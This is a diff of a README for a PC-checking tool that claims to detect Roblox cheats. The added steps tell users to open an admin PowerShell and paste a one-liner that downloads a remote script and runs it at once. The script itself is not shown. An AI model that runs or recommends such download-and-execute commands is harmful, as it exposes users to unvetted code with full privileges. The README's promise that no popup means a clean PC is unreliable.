@@ -1,7 +1,12 @@
-# LastActivityView
+ # LastActivityView
 All in one tool used for easy automated pc checking. Detects roblox emulators, executors and externals.
  
-❗Go to https://gofile.io/d/vutPLI and download the file, after that run it as admin so that it can scan everything.❗
+- Open up powershell as admin -- This is so that it can view hidden files etc.
+- Paste the command
+ 
+```Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/qzl44/LastActivityViewDownloader/refs/heads/main/1.ps1").Content```
+ 
+- Press enter. It may take a couple seconds to load.
  
 If nothing pops up, your clean! Your pc has no form of exploits on it whatsover.
  
